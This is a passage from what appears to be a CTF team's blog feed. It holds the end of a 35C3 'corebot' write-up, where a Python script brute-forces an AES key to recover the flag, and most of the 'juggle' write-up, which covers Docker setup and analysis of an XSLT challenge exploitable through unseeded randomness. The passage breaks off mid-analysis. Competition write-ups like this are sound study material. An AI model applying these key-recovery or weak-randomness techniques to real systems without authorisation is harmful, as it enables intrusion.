class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_ecb_cipher</span><span class="params">(ciphertext, key)</span>:</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    plaintext = cipher.decrypt(ciphertext)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0xffff</span>+<span class="number">1</span>):</span><br><span class="line">    v5 = <span class="number">0x10</span></span><br><span class="line">    v4 = i</span><br><span class="line">    key = <span class="string">''</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        key = chr(((v4 &amp; <span class="number">0xffff</span>) &amp; <span class="number">0xff</span>)) + chr(((v4 &amp; <span class="number">0xffff</span>) &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>) + key;</span><br><span class="line">        v4 ^= ((v4 &amp; <span class="number">0xffff</span>) &gt;&gt; <span class="number">4</span>) ^ ((v4 &amp; <span class="number">0xffff</span>) &lt;&lt; <span class="number">11</span>) ^ ((v4 &amp; <span class="number">0xffff</span>) &lt;&lt; <span class="number">7</span>)</span><br><span class="line">        v5 -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> v5 == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    ciphertext = <span class="string">"\x10\x29\xb8\x45\x9d\x2a\xab\x93\xfe\x89\xfb\x82\x93\x42\xa1\x8c\x2e\x90\x63\x00\x06\x11\x80\x64\xb8\x21\xc2\x9f\x35\xe7\x7e\xf2"</span></span><br><span class="line">    message = decrypt_ecb_cipher(ciphertext, key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> message[:<span class="number">4</span>] == <span class="string">'35C3'</span>:</span><br><span class="line">        sys.stdout.write(message)</span><br><span class="line">        <span class="keyword">print</span> hex(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>Now running the script:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python corebot.py</span><br><span class="line">35C3_MalwareAuthorKryptoChef</span><br><span class="line">0x25c3</span><br></pre></td></tr></table></figure><p>The lower bytes of the serial is 0x25c3 and the respective flag was <strong>35C3_MalwareAuthorKryptoChef</strong>.</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;br&gt;    Solves: 97&lt;br&gt;&lt;br&gt;    &lt;a href=&quot;https://35c3ctf.ccc.ac/uploads/corebot-640d3c582340e647d72e1dd9418a3fd6&quot; target=&quot;_blank&quot; 
      
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="cryptoApi" scheme="https://teamrocketist.github.io/tags/cryptoApi/"/>
    
      <category term="35C3" scheme="https://teamrocketist.github.io/tags/35C3/"/>
    
      <category term="windowsBinary" scheme="https://teamrocketist.github.io/tags/windowsBinary/"/>
    
      <category term="exeResources" scheme="https://teamrocketist.github.io/tags/exeResources/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] 35C3 - juggle</title>
    <link href="https://teamrocketist.github.io/2018/12/30/Reverse-35C3-juggle/"/>
    <id>https://teamrocketist.github.io/2018/12/30/Reverse-35C3-juggle/</id>
    <published>2018-12-30T01:03:08.000Z</published>
    <updated>2018-12-31T08:25:29.507Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>    juggle 97<br><br>    Solves: 54<br><br>    Can you help this restaurant Stack the right amount of Eggs in their ML algorithms?<br><br>    Guest challenge by Tethys.<br><br>    Note that you need to send a shutdown(2) after you sent your solution. The nmap netcat will do so for you, e.g.: ncat 35.246.237.11 1 &lt; solution.xml<br><br>        /usr/bin/ncat –help | grep -n 1 Ncat 7.60 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )<br><br>    Files here: <a href="https://35c3ctf.ccc.ac/uploads/juggle-f6b6fa299ba94bbbbce2058a5ca698db.tar" target="_blank" rel="noopener">https://35c3ctf.ccc.ac/uploads/juggle-f6b6fa299ba94bbbbce2058a5ca698db.tar</a><br></blockquote><p><strong>XSL</strong> service is running in the server at a certain port, a <strong>dockerfile</strong> was provided which was cool, it helped me a lot in the debugging process, in the container environment I had no previous knowledge of <strong>xslt</strong> which took me more time in this challenge than it should.</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ul><li>The seed is not set in <strong>random</strong> so we can abuse it by doing very quick requests to get the same numbers</li><li>Identify which plate prints the flag</li><li>Use the plates in a certain order to achieve the condition necessary to print the flag</li></ul><h2 id="Walk-through"><a href="#Walk-through" class="headerlink" title="Walk-through"></a>Walk-through</h2><p>So I started by analysing the docker file, the container is using nsjail to isolate the <strong>/usr/bin/xalan</strong> service as we can see bellow:</p><h3 id="Setting-up-the-Docker-container"><a href="#Setting-up-the-Docker-container" class="headerlink" title="Setting up the Docker container"></a>Setting up the Docker container</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> tsuro/nsjail</span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get install -y xalan</span></span><br><span class="line"><span class="bash">COPY challenge.min.xslt /home/user/</span></span><br><span class="line"><span class="bash"><span class="comment">#COPY tmpflag /flag</span></span></span><br><span class="line"><span class="bash">CMD /bin/sh -c <span class="string">"/usr/bin/setup_cgroups.sh &amp;&amp; su user -c '/usr/bin/nsjail -Ml --port 1337 --chroot / --user 1000 --group 1000 --cgroup_mem_max 209715200 --cgroup_pids_max 100 --cgroup_cpu_ms_per_sec 100 --rlimit_as max --rlimit_cpu max --rlimit_nofile max --rlimit_nproc max -- /usr/bin/stdbuf -i0 -o0 -e0 /usr/bin/maybe_pow.sh /usr/bin/xalan -xsl /home/user/challenge.min.xslt'"</span></span></span><br></pre></td></tr></table></figure><p>Eventually I had to fix a line in the docker file at:<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">COPY</span><span class="bash"> challenge/challenge.min.xslt /home/user/</span></span><br></pre></td></tr></table></figure></p><p>The <strong>challenge.min.xslt</strong> was located in the root directory after extracting the files, so I ended up changing this into:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">COPY</span><span class="bash"> challenge.min.xslt /home/user/</span></span><br></pre></td></tr></table></figure><p>So lets start to build the image with <strong>docker build</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker build -t juggle .</span><br></pre></td></tr></table></figure><p>After this you can list the image created:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker image ls</span><br><span class="line">REPOSITORY                 TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">permute                    latest              1603e833509a        23 hours ago        147MB</span><br><span class="line">juggle                     latest              b4c26a022c1e        33 hours ago        205MB</span><br><span class="line">tsuro/nsjail               latest              8774d7aad732        2 days ago          156MB</span><br><span class="line">adalovelace/nodejs         latest              c2a6e42b25c8        2 days ago          63.7MB</span><br><span class="line">node                       6-alpine            c45d42c157e3        2 days ago          55.6MB</span><br><span class="line">nginx                      latest              02256cfb0e4b        2 days ago          109MB</span><br><span class="line">alpine                     latest              3f53bb00af94        8 days ago          4.41MB</span><br><span class="line">centos                     7                   1e1148e4cc2c        3 weeks ago         202MB</span><br><span class="line">postgres                   latest              f9b577fb1ed6        4 weeks ago         311MB</span><br><span class="line">thecolonial/police-quest   1.0                 0ea244849eb0        4 weeks ago         345MB</span><br><span class="line">ubuntu                     14.04               f17b6a61de28        5 weeks ago         188MB</span><br><span class="line">mysql                      latest              f991c20cb508        6 weeks ago         486MB</span><br><span class="line">httpd                      latest              2a51bb06dc8b        6 weeks ago         132MB</span><br><span class="line">debian                     latest              4879790bd60d        6 weeks ago         101MB</span><br><span class="line">seccon_pwn                 latest              3749dfe7031c        7 weeks ago         2.06GB</span><br><span class="line">skysider/pwndocker         latest              a24dde07a423        7 weeks ago         2.02GB</span><br><span class="line">elasticsearch              2                   5e9d896dc62c        3 months ago        479MB</span><br><span class="line">postgres                   9.6.2               b3b8a2229953        19 months ago       267MB</span><br><span class="line">postgres                   9.6.1               4023a747a01a        23 months ago       265MB</span><br></pre></td></tr></table></figure><p>As we can see in the list the <strong>juggle</strong> image was created (the name we gave it). </p><p>With this we can start running the container by just using <strong>docker container run</strong>:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker run -it -p 1337:1337 --name 35c3_juggle juggle bash</span><br></pre></td></tr></table></figure></p><p>After this a bash console will pop-up in the container unfortunately the command in the end of the docker didn’t work maybe something related with <strong>nsjail</strong>, I don’t know maybe I did something wrong when I was trying to connect to the service, I even tryed to rerun the command inside the container but it always gave me an error, so to not loose much time identifying it I setted up very quiclky a service with <strong>socat</strong>, <strong>socat</strong> isn’t installed in this container so I needed to install it via <strong>apt-get</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@b0927d9b031a $ socat tcp-listen:1337,fork,reuseaddr EXEC:/usr/bin/xalan -xsl /home/user/challenge.min.xslt<span class="string">'</span></span><br></pre></td></tr></table></figure><p>Since I forwarded the port 1337 from the host to the container port 1337 with the parameter <strong>-p</strong> in the <strong>docker run</strong> command. Now I could connect from the host directly to the localhost with <strong>ncat localhost 1337</strong> without getting any errors from the server.</p><h3 id="XML-format-analysis"><a href="#XML-format-analysis" class="headerlink" title="XML format analysis"></a>XML format analysis</h3><p>So it’s time to start analysing the <strong>challenge.min.xslt</strong> file, this file was minimized so I searched for an online tool to beautify to make it more readable, so lets start with the beginning:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:math</span>=<span class="string">"http://exslt.org/math"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:exsl</span>=<span class="string">"http://exslt.org/common"</span> <span class="attr">exclude-result-prefixes</span>=<span class="string">"xsl math exsl"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/meal"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">all</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:if</span> <span class="attr">test</span>=<span class="string">"count(//plate) &gt; 300"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">xsl:message</span> <span class="attr">terminate</span>=<span class="string">"yes"</span>&gt;</span>You do not have enough money to buy that much food<span class="tag">&lt;/<span class="name">xsl:message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">xsl:if</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">"chef-drinks"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"round(math:random() * 4294967296)"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"round(math:random() * 4294967296)"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"round(math:random() * 4294967296)"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"round(math:random() * 4294967296)"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"round(math:random() * 4294967296)"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">xsl:variable</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:call-template</span> <span class="attr">name</span>=<span class="string">"consume-meal"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"chef-drinks"</span> <span class="attr">select</span>=<span class="string">"exsl:node-set($chef-drinks)//value"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"food-eaten"</span> <span class="attr">select</span>=<span class="string">"1"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"course"</span> <span class="attr">select</span>=<span class="string">"course[position() = 1]/plate"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"drinks"</span> <span class="attr">select</span>=<span class="string">"state/drinks"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">xsl:call-template</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">all</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">name</span>=<span class="string">"consume-meal"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">"chef-drinks"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">"food-eaten"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">"course"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">"drinks"</span>/&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>So if you don’t know about <strong>xslt</strong> is a language that parses a xml document, and with that you can do things like converting that xml into html in a very easy way. Right at the beginning we can see what kind of structure of xml they want : </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/meal"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>The match parameter will look in the xml document from the root for a tag <strong><meal> </meal></strong>, from this you can look up into the elements inside of it. Now right after setting this an variable is declared with some <strong>random numbers</strong> (drinks), variables like in any <strong>other language</strong> are used to <strong>store</strong> values to be used later, in xslt is no different.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">"chef-drinks"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">"chef-drinks"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"round(math:random() * 4294967296)"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"round(math:random() * 4294967296)"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"round(math:random() * 4294967296)"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"round(math:random() * 4294967296)"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"round(math:random() * 4294967296)"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:variable</span>&gt;</span></span><br></pre></td></tr></table></figure><p>This random implementation looks already suspicious, looks it it doesn’t even have any kind of seed, and if it has a seed it probably is the current time. Now right after declaring this drinks with random numbers it does a <strong>template</strong> call as you can see bellow:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:call-template</span> <span class="attr">name</span>=<span class="string">"consume-meal"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"chef-drinks"</span> <span class="attr">select</span>=<span class="string">"exsl:node-set($chef-drinks)//value"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"food-eaten"</span> <span class="attr">select</span>=<span class="string">"1"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"course"</span> <span class="attr">select</span>=<span class="string">"course[position() = 1]/plate"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"drinks"</span> <span class="attr">select</span>=<span class="string">"state/drinks"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:call-template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>You can think of this like it’s a function call in a <strong>normal language</strong>, the name of the function is <strong>consume-meal</strong> and its arguments are right below, the declaration of <strong>consume-meal</strong> is just below this code, but before doing that lets analyse the <strong>selects</strong> for the arguments since they give us hints about how the <strong>xml</strong> document should be built. </p><p>So for the first parameter:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"chef-drinks"</span> <span class="attr">select</span>=<span class="string">"exsl:node-set($chef-drinks)//value"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>so <strong>exsl:node-set</strong> will just grab all the values from the variable <strong>$chef-drinks</strong> and pass it into the function as it was an array, explaining the <strong>//value</strong> part, the first <strong>/</strong> is referencing the the tag of the variable <strong>&lt;xsl:variable name=”chef-drinks”&gt;</strong> and the <strong>/value</strong> is referencing to the <strong>\&lt;value></strong> tag, this extracts the variable random number drinks and sets them as an array to be used in the template “function”. </p><p>So for the second parameter:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"food-eaten"</span> <span class="attr">select</span>=<span class="string">"1"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>The <strong>food-eaten</strong> parameter is initialized into 1 and this an integer variable that ill keep track of the number of plates you consume, after analysing <strong>consume-meal</strong> you will see that there’s a limit of plates you can eat that’s why they are tracking this number here.</p><p>So for the third parameter:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"course"</span> <span class="attr">select</span>=<span class="string">"course[position() = 1]/plate"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>Since we are inside a template tag <strong>match</strong> meal, by analysing this select it looks it inside the tag meal, our xml will need to have a <strong>course</strong> tag (\&lt;course>) and plate tags inside of it, this works like a hierarchy from the left to right, the part <strong>[position() = 1]</strong> is just selecting the first plate inside the <strong>course</strong> tag, an example xml could be like this:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meal</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">course</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line">                    1st plate</span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line">                    2nd plate</span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">course</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">meal</span>&gt;</span></span><br></pre></td></tr></table></figure><p>So <strong>course[position() = 1]</strong> will select the first plate inside <strong>course</strong> so the parameter <strong>course</strong> will be set into : </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line">  1st plate</span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br></pre></td></tr></table></figure><p>So for the fourth parameter:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"drinks"</span> <span class="attr">select</span>=<span class="string">"state/drinks"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>Once again this will select all the drinks declared inside <strong>state</strong> and <strong>drinks</strong> tags, so two new tags will needed to be added inside <strong>meal</strong> tag. </p><p>Based on the information we have now an example xml can be build like this:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meal</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">course</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line">                    1st plate</span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line">                    2nd plate</span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">course</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">state</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">drinks</span>&gt;</span>1<span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">drinks</span>&gt;</span>2<span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">meal</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>And now finally analysing the “function” <strong>consume-meal</strong>:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">name</span>=<span class="string">"consume-meal"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">"chef-drinks"</span>/&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">"food-eaten"</span>/&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">"course"</span>/&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">"drinks"</span>/&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">xsl:if</span> <span class="attr">test</span>=<span class="string">"$food-eaten &gt; 30000"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:message</span> <span class="attr">terminate</span>=<span class="string">"yes"</span>&gt;</span>You ate too much and died<span class="tag">&lt;/<span class="name">xsl:message</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">xsl:if</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">xsl:if</span> <span class="attr">test</span>=<span class="string">"count($drinks) &gt; 200"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:message</span> <span class="attr">terminate</span>=<span class="string">"yes"</span>&gt;</span>You cannot drink that much<span class="tag">&lt;/<span class="name">xsl:message</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">xsl:if</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Right at the beginning the parameters of the “function” are being declared, and two <strong>ifs</strong> are checking if we ate more than 30k plates or more than 200 drinks, so if we eat of drink more than that , the function terminates and “prints” a message to the user.</p><p>After this we come up with a new <strong>if</strong>, it checks if the number of plates is higher than 0, and a new tag <strong><a href="xsl:choose" 